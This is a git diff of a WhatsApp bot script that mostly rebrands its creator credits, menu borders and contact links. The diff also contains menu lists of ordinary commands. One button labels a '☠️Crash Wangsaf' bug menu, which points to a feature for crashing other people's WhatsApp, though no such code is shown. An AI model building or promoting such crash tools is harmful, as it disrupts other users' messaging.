+"newsletterName": '𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈',
 "serverMessageId": 1
 },
 },
@@ -1797,13 +1791,13 @@ interactiveMessage: {
 "text": ""
 },
 "footer": {
-"text": "Alfin Faridh Taufiqiy"
+"text": "𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈"
 },
 "nativeFlowMessage": {
 "buttons": [
 {
 "name": "single_select",
-"buttonParamsJson": `{ "title": "Alfin Faridh Taufiqiy", "sections": [{ "title": "›𝘚𝘦𝘭𝘦𝘤𝘪𝘰𝘯𝘦 𝘶𝘮", "highlight_label": "☠️Crash Wangsaf️", "rows": [{ "header": "›𝙱𝚞𝚐 𝙼𝚎𝚗𝚞", "title": "Alfin Faridh Taufiqiy", "id": ".bugmenu" }, { "header": "›𝙰𝚕𝚕 𝙼𝚎𝚗𝚞", "title": "Alfin Faridh Taufiqiy", "id": ".allmenu" }, { "header": "›𝙸𝚗𝚏𝚘 𝙱𝚘𝚝𝚣", "title": "Alfin Faridh Taufiqiy", "id": ".infobot" }] }] }`
+"buttonParamsJson": `{ "title": "𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈⚡", "sections": [{ "title": "›𝘚𝘦𝘭𝘦𝘤𝘪𝘰𝘯𝘦 𝘶𝘮", "highlight_label": "☠️Crash Wangsaf️", "rows": [{ "header": "›𝙱𝚞𝚐 𝙼𝚎𝚗𝚞", "title": "APIN VIP V7", "id": ".bugmenu" }, { "header": "›𝙰𝚕𝚕 𝙼𝚎𝚗𝚞", "title": "APIN VIP V7", "id": ".allmenu" }, { "header": "›𝙸𝚗𝚏𝚘 𝙱𝚘𝚝𝚣", "title": "APIN VIP V7", "id": ".infobot" }] }] }`
 },
 {
 "name": "cta_url",
@@ -1811,7 +1805,7 @@ interactiveMessage: {
 },
 {
 "name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Channel Youtube\",\"url\":\"https://whatsapp.com/channel/0029VafJowe7dmeZ941VPt16\",\"merchant_url\":\"https://whatsapp.com/channel/0029VafJowe7dmeZ941VPt16\"}"
+"buttonParamsJson": "{\"display_text\":\"Whatsapp Owner\",\"url\":\"https://api.whatsapp.com/send/?phone=6281231948641&text&type=phone_number&app_absent=0\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=6281231948641&text&type=phone_number&app_absent=0\"}"
 },
 {
 "name": "cta_url",
@@ -1832,7 +1826,7 @@ let kontollurus = {
 image: bangke,
 caption: njing,
 contextInfo:{externalAdReply:{
-title: '⟠ Alfin Faridh Taufiqiy',
+title: '⟠ 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈',
 body: `👤 名前 : ${m.pushName}\n🕑${ucapanWaktu}`, 
 showAdAttribution: true,
 thumbnail: mydick,
@@ -1857,16 +1851,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -1893,7 +1882,8 @@ m.reply(`─✈
 ││✑${prefix}tiktoksantuy
 ││✑${prefix}paptt *foto/video*
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 
@@ -1904,16 +1894,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -1929,7 +1914,6 @@ m.reply(`─✈
 │𝐓𝐢𝐦𝐞 : *${time}*
 │𝐖𝐞𝐞𝐤 : *${week}*
 └─────────────┈ ✈
-┌└─────────────┈ ✈
 ││✑${prefix}addowner *6288xxx*
 ││✑${prefix}delowner *628xxx*
 ││✑${prefix}addprem *6288xxx*
@@ -1959,7 +1943,8 @@ m.reply(`─✈
 ││✑${prefix}setbiobot *teks*
 ││✑${prefix}listpc
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 }
@@ -1971,16 +1956,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -1996,7 +1976,6 @@ m.reply(`─✈
 │𝐓𝐢𝐦𝐞 : *${time}*
 │𝐖𝐞𝐞𝐤 : *${week}*
 └─────────────┈ ✈
-┌└─────────────┈ ✈
 ││✑${prefix}cekkhodamcore *nama*
 ││✑${prefix}cekkhodam *nama*
 ││✑${prefix}cekjodoh *nama*
@@ -2089,7 +2068,8 @@ m.reply(`─✈
 ││✑${prefix}Zodiak
 ││✑${prefix}Shio
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 }
@@ -2101,16 +2081,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2126,7 +2101,6 @@ m.reply(`─✈
 │𝐓𝐢𝐦𝐞 : *${time}*
 │𝐖𝐞𝐞𝐤 : *${week}*
 └─────────────┈ ✈
-┌└─────────────┈ ✈
 ││✑${prefix}toimg *reply stiker*
 ││✑${prefix}toaudio *reply video*
 ││✑${prefix}sticker *reply gambar*
@@ -2138,7 +2112,8 @@ m.reply(`─✈
 ││✑${prefix}attp *teks
 ││✑${prefix}styletext *teks*
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 }
@@ -2150,16 +2125,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2175,11 +2145,11 @@ m.reply(`─✈
 │𝐓𝐢𝐦𝐞 : *${time}*
 │𝐖𝐞𝐞𝐤 : *${week}*
 └─────────────┈ ✈
-┌└─────────────┈ ✈
 ││✑${prefix}dall-e Ilustrasi 
 ││✑${prefix}stablediffusion ilustrasi
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
  }
@@ -2191,16 +2161,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2216,7 +2181,6 @@ m.reply(`─✈
 │𝐓𝐢𝐦𝐞 : *${time}*
 │𝐖𝐞𝐞𝐤 : *${week}*
 └─────────────┈ ✈
-┌└─────────────┈ ✈
 ││✑${prefix}google-article *query*
 ││✑${prefix}google-search *query*
 ││✑${prefix}search-kbbi *query*
@@ -2224,7 +2188,8 @@ m.reply(`─✈
 ││✑${prefix}search-resep
 ││✑${prefix}search-sticker
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 }
@@ -2236,16 +2201,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2274,7 +2234,8 @@ m.reply(`─✈
 ││✑${prefix}Slow *ReplyAudio*
 ││✑${prefix}Tupai *ReplyAudio*
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 
@@ -2286,16 +2247,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2321,7 +2277,8 @@ m.reply(`─✈
 ││✑${prefix}quotesislami
 ││✑${prefix}doatahlil
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 
@@ -2333,16 +2290,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2393,7 +2345,8 @@ m.reply(`─✈
 ││✑${prefix}antilink *on / off*
 ││✑${prefix}cekidgc *link gc*
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 }
@@ -2405,16 +2358,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2430,7 +2378,6 @@ m.reply(`─✈
 │𝐓𝐢𝐦𝐞 : *${time}*
 │𝐖𝐞𝐞𝐤 : *${week}*
 └─────────────┈ ✈
-┌└─────────────┈ ✈
 ││✑${prefix}gitclone *url*
 ││✑${prefix}mediafire *url*
 ││✑${prefix}tiktokmp3 *url*
@@ -2445,7 +2392,8 @@ m.reply(`─✈
 ││✑${prefix}pintmp4 *url*
 ││✑${prefix}happymod *nama apk*
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 }
@@ -2457,16 +2405,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
